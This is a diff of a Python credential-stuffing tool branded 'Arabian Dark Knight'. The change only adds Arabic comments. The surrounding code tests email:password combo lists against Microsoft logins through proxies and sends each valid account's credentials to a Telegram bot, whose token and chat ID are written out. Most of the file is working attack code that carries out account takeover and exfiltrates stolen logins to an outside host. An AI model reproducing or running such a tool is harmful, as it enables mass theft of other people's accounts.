@@ -6,16 +6,18 @@ from mailhub import MailHub
 from concurrent.futures import ThreadPoolExecutor
 import os
 
+# عرض الشعار
 logo = pyfiglet.figlet_format('MASA')
 print(logo)
 
 mail = MailHub()
 write_lock = threading.Lock()
 
-
+# إعدادات بوت تيليجرام
 TELEGRAM_BOT_TOKEN = '8015416576:AAF-x4yxWwEnlGo9m17VRzvWkFVyWR2qf3Y'
 TELEGRAM_CHAT_ID = '7957784778'
 
+# دالة للتحقق من صحة السطر
 def validate_line(line):
     parts = line.strip().split(":")
     if len(parts) == 2:
@@ -23,6 +25,7 @@ def validate_line(line):
     else:
         return None, None
 
+# دالة لمحاولة تسجيل الدخول
 def attempt_login(email, password, proxy, hits_file, local_hits_file):
     try:
         res = mail.loginMICROSOFT(email, password, proxy)[0]
@@ -39,14 +42,12 @@ def attempt_login(email, password, proxy, hits_file, local_hits_file):
     except Exception as e:
         print(f"Error logging in {email}:{password} - {str(e)}")
 
+# دالة لإرسال رسالة إلى تيليجرام
 def send_to_telegram(email, password):
     message = f"""
 Arabian Dark Knight - @ArabianDarkKnight - @DarkKnightArabian
 
-
 Valid Acc : {email}:{password}
-
-
     """
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
@@ -62,6 +63,7 @@ Valid Acc : {email}:{password}
     except Exception as e:
         print(f"An error occurred while sending to Telegram: {e}")
 
+# دالة لمعالجة ملف الكومبو
 def process_combo_file(hits_file, local_hits_file, proxies, combo_path):
     try:
         with open(combo_path, "r") as file:
@@ -79,6 +81,7 @@ def process_combo_file(hits_file, local_hits_file, proxies, combo_path):
     except Exception as e:
         print(f"Error processing combo file: {e}")
 
+# الدالة الرئيسية
 def main():
     combo_path = input("Enter the path to the combo file: ")
     proxy_path = input("Enter the path to the proxy file (or press Enter to skip): ")
